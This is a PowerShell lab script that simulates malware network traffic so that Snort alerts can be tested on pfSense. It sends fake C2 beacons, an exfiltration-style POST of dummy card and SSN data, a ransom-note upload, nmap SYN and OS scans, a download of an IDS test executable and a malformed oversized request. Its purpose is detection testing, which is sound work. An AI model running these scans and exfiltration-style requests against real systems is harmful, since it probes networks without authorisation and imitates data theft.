# Lab-safe (no real malware), but DO NOT run outside an isolated environment.
# ---------------------
# CONFIGURATION
# ---------------------
$TargetWeb = "example.com"   # might get error because of the domain you can use a dummy web server 
$TargetVM = "198.167.xx.xx"   # Change to one of your lab VM IPs
$BadDomain = "sinkhole.shadowserver.org"


$Tasks = @(
    "Simulated C2 Botnet Beacon",
    "Fake Ransomware Note Upload",
    "Data Exfiltration Simulation",
    "ET Malware Test Beacon",
    "TCP SYN Scan + OS Detection",
    "DNS Queries to Sinkhole",
    "Suspicious File Download",
    "Fake P2P Client Request",
    "HTTP Evasion / Malformed Request"
)


function Show-ProgressBar {
    param (
        [int]$Current,
        [int]$Total,
        [string]$Activity
    )
    $Percent = ($Current / $Total) * 100
    Write-Progress -Activity $Activity -Status "$Current of $Total steps completed" -PercentComplete $Percent
}

Write-Host "`n[*] Starting simulated malware traffic..." -ForegroundColor Yellow


for ($i = 0; $i -lt $Tasks.Count; $i++) {
    $Step = $i + 1
    $TaskName = $Tasks[$i]
    Show-ProgressBar -Current $Step -Total $Tasks.Count -Activity "Running: $TaskName"

    try {
        switch ($i) {
            0 {
                Write-Host "[+] $TaskName"
                Invoke-WebRequest -Uri "http://$TargetWeb" -UserAgent "MalwareC2/5.0 (WinNT; x86; ZeusBot)" -UseBasicParsing | Out-Null
            }
            1 {
                Write-Host "[+] $TaskName"
                $Note = "!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!" * 10
                Invoke-RestMethod -Uri "http://$TargetWeb/ransom/upload.php" -Method POST -Body @{ note = $Note } | Out-Null
            }
            2 {
                Write-Host "[+] $TaskName"
                $FakeData = "CreditCardNumber=4111111111111111&SSN=123-45-6789" * 50
                Invoke-RestMethod -Uri "http://$TargetWeb/exfil" -Method POST -Body @{ dump = $FakeData } | Out-Null
            }
            3 {
                Write-Host "[+] $TaskName"
                Invoke-WebRequest -Uri "http://testmynids.org/uid/index.html" -UseBasicParsing | Out-Null
            }
            4 {
                Write-Host "[+] $TaskName"
                if (Get-Command nmap.exe -ErrorAction SilentlyContinue) {
                    nmap.exe -sS -Pn -T4 $TargetVM | Out-Null
                    nmap.exe -O -Pn -T4 $TargetVM | Out-Null
                } else {
                    Write-Host "[!] Nmap not found, skipping scan" -ForegroundColor Red
                }
            }
            5 {
                Write-Host "[+] $TaskName"
                Resolve-DnsName $BadDomain -ErrorAction SilentlyContinue | Out-Null
                Resolve-DnsName "abcdefghijklmnop.biz" -ErrorAction SilentlyContinue | Out-Null
            }
            6 {
                Write-Host "[+] $TaskName"
                Invoke-WebRequest -Uri "http://testmyids.com/policy/test.exe" -OutFile "$env:TEMP\test.exe" -UseBasicParsing | Out-Null
            }
            7 {
                Write-Host "[+] $TaskName"
                Invoke-WebRequest -Uri "http://$TargetWeb" -UserAgent "BitTorrent/7.10.5" -UseBasicParsing | Out-Null
            }
            8 {
                Write-Host "[+] $TaskName"
                $tcp = New-Object System.Net.Sockets.TcpClient($TargetWeb, 80)
                $stream = $tcp.GetStream()
                $writer = New-Object System.IO.StreamWriter($stream)
                $writer.Write("GET / HTTP/1.1`r`nHost: $TargetWeb`r`nX-Fake-Header: " + ("A" * 5000) + "`r`n`r`n")
                $writer.Flush()
                $tcp.Close()
            }
        }
    } catch {
        Write-Host "[-] Error during '$TaskName': $_" -ForegroundColor Red
    }

    Start-Sleep -Milliseconds 800 
}

Write-Progress -Activity "Running: $TaskName" -Completed
Write-Host "`n[+] Malware simulation test completed. Check pfSense → Snort → Alerts." -ForegroundColor Green
